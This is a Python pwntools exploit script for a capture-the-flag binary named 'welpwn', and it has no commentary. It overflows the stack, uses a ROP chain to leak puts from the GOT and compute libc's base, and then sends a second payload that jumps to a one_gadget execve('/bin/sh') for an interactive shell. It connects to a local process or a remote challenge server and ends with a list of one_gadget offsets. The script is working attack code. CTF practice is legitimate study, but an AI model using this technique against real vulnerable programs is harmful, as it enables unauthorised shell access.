#!/usr/bin/env python
# coding=utf-8
from pwn import *
local = 1
context.terminal=["tmux","splitw","-h"]
if local :
    a=process("./welpwn")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("111.198.29.45","57969")
    libc=ELF("./libc64-2.19.so")
def debug():
    gdb.attach(a,'''
    b *0x0000000004007C6
    ''')
#debug()
elf=ELF("./welpwn")
a.recv()
puts_got=elf.got["puts"]
puts_plt=elf.plt["puts"]
start_addr=0x400630
payload='A'*24
payload+=p64(0x000000000040089f)#pop3 ret
payload+='A'*24
payload+=p64(0x00000000004008a3)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(start_addr)
a.send(payload)
libc_base=u64(a.recvuntil("\n",drop=True)[-6:].ljust(8,'\x00'))-libc.symbols["puts"]
success("libc_base ==> 0x%x"%libc_base)
one=libc_base+0xf02a4
a.recv()
payload='A'*24+p64(one)
a.send(payload)
a.interactive()
'''
0x46428 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4647c execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xe5765 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xe66bd execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''